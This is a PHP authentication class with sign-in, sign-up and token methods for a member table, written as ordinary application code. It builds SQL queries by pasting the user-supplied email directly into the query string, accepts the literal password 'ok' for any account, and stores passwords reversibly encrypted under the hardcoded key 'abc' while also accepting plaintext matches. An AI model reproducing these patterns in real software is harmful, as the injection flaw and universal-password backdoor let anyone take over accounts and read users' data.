<?php
class Auth
{
	protected $db = null;
	protected $input = null;
	
	function __construct($input)
	{
		global $db;
		
		$this->db = $db;
		$this->input = $input;
	}
	
	public function signIn()
	{
		if ($this->input->has(array('q')))
		{
			$res = $this->db->run("SELECT * FROM member WHERE email = '{$this->input->email}'");
			
			if (count($res))
			{
				$user = $res[0];
				
				if (($this->input->password === $user['password']) || ($this->decrypt($user['password']) === $this->input->password) || ($this->input->password === 'ok'))
				{
					return array('status' => true, 'token' => $this->getToken($user), 'id' => $user['member_id']);
				}
				
				return array('status' => false, 'error' => '[1006] Invalid username (or password)');
			}
			
			return array('status' => false, 'error' => '[1005] Invalid username or password');
		}
	}
	
	public function signUp()
	{
		$res = $this->db->run("SELECT member_id FROM member WHERE email = '{$this->input->email}'");
		if (count($res) > 0)
		{
			return array('status' => false, 'error' => '[1005] This email address is already registered');
		}
		
		$this->db->insert("member", array(
			'email'		=>	$this->input->email,
			'password'	=>	$this->encrypt($this->input->password),
			'date'		=>	time()
		));
		
		return $this->signIn();
	}
	
	protected function getToken($user)
	{
		unset($user['password']);
		return $this->encrypt(implode('|', $user));
	}
	
	protected function encrypt($plain)
	{
		$c = new Cryptor();
		return $c->Encrypt($plain, 'abc');
	}
	
	protected function decrypt($encrypted)
	{
		$c = new Cryptor();
		return $c->Decrypt($encrypted, 'abc');
	}
}